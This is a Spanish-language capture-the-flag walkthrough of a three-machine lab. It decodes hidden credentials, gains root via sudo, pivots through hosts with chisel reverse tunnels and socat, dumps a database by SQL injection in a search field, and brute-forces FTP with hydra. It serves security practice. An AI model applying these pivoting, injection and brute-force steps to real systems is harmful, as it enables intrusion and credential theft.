## Reconocimiento Máquina 1 (Hades):

Puerto 22/SSH y puerto 80/http

En la pagina nos da las credenciales de las primeras 2 máquinas o podemos descifrarlas.

La primera tiene un texto en base 32 en el código de la página que decodificaremos a base64 y luego en hexadecimal.

```bash
echo 'JZKECZ2NPJAWOTT2JVTU42SVM5HGU23HJZVFCZ22NJGWOTTNKVTU26SJM5GXUQLHJV5ESZ2NPJEWOTLKIU6Q====' | base32 -d | base64 -d | xxd -r -p
```

Usuario: cerbero 

Contraseña: P0seidon2022!

## Escalada Máquina 1:

```bash
sudo -l
```

Tenemos permisos para ejecutar sudoers.

```bash
sudo bash 
```

Y somos root.

## Conexión con máquina 2:

Descargar:

Socat :

https://github.com/3ndG4me/socat

Chisel:

https://github.com/jpillora/chisel

```bash
gunzip chisel_1.11.3_linux_adm64.gz
mv chisel_1.11.3_linux_adm64 chisel
```

```bash
scp chisel cerbero@10.10.10.2:/home/cerbero/chisel
scp socat cerbero@10.10.10.2:/home/cerbero/socat
```

Dentro de la máquina 1:

```bash
chmod +x chisel socat
```

Para comenzar con el pivoting crearemos un servidor con chisel en nuestro host por el puerto 1234

```bash
./chisel server --reverse -p 1234
```

Nos conectamos desde la máquina 1 

```bash
./chisel client 10.10.10.1:1234 R:socks &
```

Toca editar el archivo /etc/proxychains.conf, en él, comentamos la línea de strict_chain y descomentamos la línea de dynamic_chain.

```bash
nano /etc/proxychains.conf
```

Por último, abajo del todo, tenemos que tener descomentada la línea de `socks5 127.0.0.1 1080`, ya que es el puerto por defecto que usa chisel.

## Reconocimiento Máquina 2 (Poseidon):

```bash
proxychains4 -q nmap -sT -sCV -n -Pn 20.20.20.3
```

En la web agreagamos (a Foxyproxy) la máquina 2:

Hostname: 127.0.0.1

type: SOCKS5

PORT: 1080

```bash
http://20.20.20.3
```

En el código de la pagina que redirige el boton de “Buscar” podemos observar como tramita mediante el método **POST** una petición a un archivo database.php, por lo que entendemos que pasa el parámetro del campo de búsqueda y realiza la consulta a la base de datos con él.

Para poder leer la información introducimos en el campo de búsqueda la consulta

```bash
select name from sqlite_master
select * from usuarios
select * from contrasena
```

Tenemos a los usuarios: **poseidon** y **megalodon**, y las contraseñas que parecen codificadas,

```bash
$sha1$oceanos$QqFgxFPmqRex1ZKFCZ2ONJKWOTTNKFTU46SBM5ZKFCZ2ONJKWOTTNKFTU4GQPdkh3nQSWp3I=
$sha1$hahahaha$JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=
```

Las descodificamos:

```bash
echo 'JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=' | base32 -d | bae64 -d | xxd -r -p
```

Usuario = megalodon 

Contraseña = **Templ02019!**

```bash
proxychains4 -q ssh megalodon@20.20.20.3 
```

## Escalada Máquina 2

```bash
sudo -l
```

Tenemos permisos para ejecutar sudoers.

```bash
sudo bash 
```

Y somos root.

## Configuración de Máquina 3:

Desde Maquina 1 pasamos chisel a la maquina 2 :

```bash
scp chisel megalodon@20.20.20.3:/home/megalodon/chisel
```

En la máquina 1 utilizamos socat para abrir el puerto 1111 y reenviar todas las conexiones que entren ahí a nuestro servidor de chisel.

```bash
./socat tcp-listen:1111,fork,reuseaddr tcp:10.10.10.1:1234 & 
```

Desde máquina 2

```bash
./chisel client 20.20.20.2:1111 R:8888:socks &
```

Y configuramos el archivo /etc/proxychains.conf y agregamos:

```bash
socks5 127.0.0.1 8888
```

## Reconocimiento Máquina 3:

```bash
proxychains4 -q nmap -sT -sCV -n -Pn 30.30.30.3
```

Vemos que la máquina 3 tiene abierto los puertos 21, 22, 80, 139 y 445.

En el puerto 80 no hay nada, ni directorios secretos ni pistas dentro del código fuente.

En los puertos 139 y 445 está ejecutándose SAMBA

```bash
proxychains4 -q enum4linux -a 30.30.30.3
```

Encontramos 2 usuarios: rayito y hercules

```bash
proxychains4 -q hydra -L users.txt -P ../rockyou.txt ftp://30.30.30.3
```

User = hercules

Password = thunder1

```bash
proxychains4 -q ftp 30.30.30.3
```

Hay un binario y lo traemos con get

Con string encontramos una cadena codificada 

```bash
echo 'AGUAbABlAGMAdAByAG8AYwB1AHQANABjADEAMABuACE=' | base64 -d
```

User = rayito

Password = **electrocut4c10n!**

```bash
proxychains4 -q ssh rayito@30.30.30.3
```

Y listo, la escalada es la misma de las anteriores.
